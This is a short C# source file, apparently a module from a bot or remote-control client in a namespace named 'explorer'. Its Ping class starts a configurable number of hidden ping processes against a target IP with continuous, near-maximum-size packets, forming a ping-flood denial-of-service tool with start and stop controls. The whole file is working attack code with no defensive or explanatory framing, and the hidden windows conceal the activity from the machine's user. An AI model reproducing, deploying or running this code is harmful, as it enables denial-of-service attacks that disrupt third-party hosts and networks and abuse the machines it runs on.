using System.Collections.Generic;
using System.Diagnostics;

namespace explorer;

internal class Ping
{
	public static List<Process> processes = new List<Process>();

	public static int threads;

	public static string ip;

	public static bool running = false;

	public static void start()
	{
		if (!running)
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "ping";
			processStartInfo.Arguments = ip + " -t -l 65500";
			for (int i = 0; i < threads; i++)
			{
				processes.Add(new Process());
			}
			for (int j = 0; j < threads; j++)
			{
				processes[j].StartInfo = processStartInfo;
			}
			for (int k = 0; k < threads; k++)
			{
				processes[k].Start();
			}
			running = !running;
		}
	}

	public static void stop()
	{
		if (running)
		{
			for (int i = 0; i < threads; i++)
			{
				processes[i].Kill();
			}
			running = !running;
		}
	}
}
